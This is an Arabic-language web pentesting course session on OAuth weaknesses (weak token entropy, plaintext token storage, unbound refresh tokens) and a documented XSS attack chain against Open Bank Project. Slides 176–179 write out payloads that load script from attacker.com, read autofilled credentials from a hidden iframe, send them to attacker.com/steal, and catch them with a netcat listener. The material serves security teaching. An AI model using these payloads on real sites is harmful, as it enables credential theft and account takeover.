# الجلسة 12: OAuth Attacks المتقدمة + سيناريو هجوم حقيقي
## Slides 169 → 180

---

## Slide 169-170: Weak Handle-Based Access and Refresh Tokens

> لو الـ Access Tokens أو الـ Refresh Tokens عندهم **Entropy منخفضة** (مش عشوائية كفاية)، المهاجم ممكن يخمنها أو يتنبأ بيها.

### كيفية الاختبار:

```
1. حدد مكان الـ Token Endpoint:
   - https://[server]/.well-known/openid-configuration
   - https://[server]/.well-known/OAuth-authorization-server
   - أو عادةً على: /token

2. ابعت Requests صالحة واجمع عدة Tokens
   (محتاج Client ID و Secret + Authorization Codes صالحة)

3. ابعت الـ Tokens لـ Burp Sequencer

4. حلل الـ Entropy — لو ضعيفة → يقدر يتخمنوا
```

```http
POST /token HTTP/1.1
Host: gallery:3005

code=9
&redirect_uri=http://photoprint:3000/callback
&grant_type=authorization_code
&client_id=photoprint
&client_secret=secret
```

---

## Slide 171: Insecure Storage of Tokens

> لو الـ Tokens مخزنة كـ **Plain Text** في قاعدة البيانات (مش Hashed)، مهاجم يقدر يسرقهم عن طريق SQL Injection أو NoSQL Injection.

### كيفية الاختبار:

| الطريقة | الوصف |
|---------|-------|
| **اختبار Injection** | لو لقيت SQL/NoSQL Injection في التطبيق، اقرأ الـ Tokens من الـ Database |
| **Code Review** | افحص الكود — الـ Tokens لازم تتخزن مشفرة أو مـ Hashed |

> أفضل طريقة للتحقق من ده هي **Code Review**. لو مش متاح، حاول تستغل أي Injection تلاقيها وتتحقق من شكل الـ Tokens في الـ Database.

---

## Slide 172: Refresh Token Not Bound to Client

> لو الـ Refresh Token مش مربوط بالـ Client اللي اتصدرله، مهاجم يقدر يبادله بـ Access Token من Client مختلف.

### السيناريو:

```
1. المهاجم يسرق أو يخمن Refresh Token صالح
2. يبعته مع بيانات Client مختلف (malicious client)
3. لو الـ Authorization Server ما تحققش → يحصل على Access Token جديد!
```

### ده خطير بالذات لو التطبيق بيسمح بـ **Automatic Client Registration** — المهاجم يقدر يسجل Client خاص بيه ويستخدمه.

---

## Slide 173-174: OAuth Attack Scenario 2 - سيناريو حقيقي

> السيناريو ده اتاكتشف أثناء Pentest حقيقي على أول إصدارات **Open Bank Project (OBP)** — منصة بنكية مفتوحة المصدر.

### السياق:

- التطبيق كان مأمّن كويس جداً — الـ Input Sanitization كانت ممتازة في كل مكان
- **بس** من خلال فحص الـ OAuth Implementation، اتلقت ثغرة واحدة كانت كافية لسلسلة هجوم كاملة

الهجوم ده مثال عملي على **Attack Chaining** — ربط عدة ثغرات صغيرة مع بعض عشان توصل لنتيجة كبيرة.

---

## Slide 175: Step 0 — اكتشاف ثغرة XSS في OAuth

```
الثغرة: Reflected XSS في Parameter الـ redirectUrl
الصفحة: http://openbankdev:8080/OAuth/thanks
الـ Attack Vector: http://openbankdev:8080/OAuth/thanks?redirectUrl=[JS Code]
```

الـ `redirectUrl` parameter ما كانش بيتنقي من الـ Malicious Input — وده فتح الباب لحقن JavaScript.

> التطبيق كله كان مأمّن إلا المكان ده بالظبط. ده بيوضح ليه لازم كل Input في التطبيق يتفحص — مش بس الأماكن الواضحة.

---

## Slide 176: Step 1 — تحميل JavaScript خارجي

المهاجم قدر يحمّل ملف JavaScript من سيرفر خارجي داخل صفحة الـ OBP. الـ Payload كان jQuery-specific:

```html
<!-- الـ XSS بتحمّل سكريبت خارجي من سيرفر المهاجم: -->
<script src="http://attacker.com/malicious.js"></script>
```

---

## Slide 177: Step 2 — إنشاء iFrame خفي

> باستخدام الـ JavaScript المحقون، المهاجم أنشأ **iFrame غير مرئي** فيه صفحة Login بتاعة OBP.

ده كان ممكن لأن:
- الـ **X-Frame-Options** header كان مضبوط على `SAMEORIGIN`
- والـ XSS بيشتغل من **نفس الـ Origin** — يعني الـ iFrame اتسمحله

```javascript
// إنشاء iFrame خفي فيه صفحة Login:
var iframe = document.createElement('iframe');
iframe.src = '/login';
iframe.style.display = 'none';
document.body.appendChild(iframe);
```

---

## Slide 178: Step 3 — سرقة بيانات الدخول

> لأن المتصفح عنده **Autocomplete** مفعّل، صفحة الـ Login في الـ iFrame ملأت الـ Username والـ Password تلقائياً.

المهاجم حقن JavaScript يقرأ البيانات من الـ iFrame:

```javascript
// قراءة بيانات الدخول من الـ iFrame:
var loginFrame = document.querySelector('iframe');
var username = loginFrame.contentDocument.querySelector('#username').value;
var password = loginFrame.contentDocument.querySelector('#password').value;

// إرسالها لسيرفر المهاجم:
new Image().src = 'http://attacker.com/steal?u=' + username + '&p=' + password;
```

---

## Slide 179: Step 4 — استلام البيانات

المهاجم كان شغّل **Netcat Listener** على سيرفره. البيانات وصلته:

```bash
nc -lvp 80
# Request وصل:
# GET /steal?u=admin&p=SecureP@ss! HTTP/1.1
```

---

## Slide 180: Bonus Step — CSRF Attack

> المهاجم ربط نفس ثغرة الـ XSS مع:
> - الـ X-Frame-Options الضعيف لصفحة "Get API Key"
> - ثغرة CSRF في وظيفة إنشاء API Keys

**النتيجة:** المهاجم قدر ينشئ API Key باسم الضحية بدون علمه.

### ملخص سلسلة الهجوم:

```
Step 0: اكتشاف XSS في OAuth redirectUrl parameter
    ↓
Step 1: تحميل JavaScript خبيث من سيرفر خارجي
    ↓
Step 2: إنشاء iFrame خفي فيه Login Page (X-Frame-Options = SAMEORIGIN)
    ↓
Step 3: Autocomplete ملأ البيانات → JavaScript قرأها
    ↓
Step 4: البيانات اتبعتت لسيرفر المهاجم
    ↓
Bonus: CSRF لإنشاء API Key باسم الضحية
```

| الثغرة | لوحدها | مع السلسلة |
|--------|--------|-----------|
| **Reflected XSS** | Medium | Part of Critical Chain |
| **X-Frame-Options: SAMEORIGIN** | Low | Enabled iFrame Attack |
| **Autocomplete Enabled** | Low | Auto-filled Credentials |
| **CSRF** | Medium | Created Unauthorized API Key |

> الدرس المستفاد: ثغرة واحدة "متوسطة" ممكن تتحول لـ **Critical** لما تتربط مع ثغرات تانية. في الـ Pentesting، دايماً فكر: "هل أقدر أربط الثغرة دي مع حاجة تانية عشان أزوّد التأثير؟"

---

## ملخص الجلسة الثانية عشر

| المفهوم | الشرح | الخطورة |
|---------|-------|---------|
| **Weak Tokens** | Tokens بـ Entropy منخفضة — ممكن تتخمن | High |
| **Insecure Token Storage** | Tokens مخزنة Plain Text في الـ DB | High |
| **Refresh Token Not Bound** | Refresh Token يشتغل مع أي Client | High |
| **Attack Chaining** | ربط ثغرات صغيرة = تأثير كبير | Varies |
| **XSS + iFrame + Autocomplete** | سلسلة هجوم حقيقية على بنك | Critical |

> الجلسة الجاية هندخل في **تخطي المصادقة الثنائية (2FA Bypass)** — أنواع الـ 2FA، تقنيات التخطي، ومنهجية الاختبار.
